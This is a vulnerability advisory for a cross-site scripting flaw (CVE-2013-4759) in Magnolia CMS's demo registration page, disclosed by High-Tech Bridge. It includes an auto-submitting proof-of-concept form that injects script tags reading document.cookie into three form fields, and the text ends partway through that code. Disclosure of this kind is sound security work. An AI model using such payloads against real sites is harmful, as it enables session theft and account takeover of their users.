Advisory Details:

High-Tech Bridge Security Research Lab discovered XSS vulnerability in Magnolia CMS, which can be exploited to perform Cross-Site Scripting attacks against users of vulnerable application.


1) Cross-Site Scripting (XSS) in Magnolia CMS: CVE-2013-4759

The vulnerability exists due to insufficient sanitisation of user-supplied data in "username", "fullname" and "email" HTTP POST parameters passed to "/magnoliaPublic/demo-project/members-area/registration.html" URL.

A remote attacker can trick victim to open a specially crafted link and execute arbitrary HTML and scripting code in his browser in context of the vulnerable website.

The exploitation example below uses the "alert()" JavaScript function to display user's cookies:


<form action="http://[host]/magnoliaPublic/demo-project/members-area/registration.html" method="post" name="main">
<input type="hidden" name="mgnlModelExecutionUUID"  value="8417fe0e-8f61-4d21-bdf1-c9c23b13ba14">
<input type="hidden" name="password"  value='password'>
<input type="hidden" name="passwordConfirmation"  value='password'>
<input type="hidden" name="username"  value='"><script>alert(document.cookie);</script>'>
<input type="hidden" name="fullName"  value='"><script>alert(document.cookie);</script>'>
<input type="hidden" name="email"  value='"><script>alert(document.cookie);</script>'>
<input type="submit" id="btn">
</form>
<script>
document.main.submit();
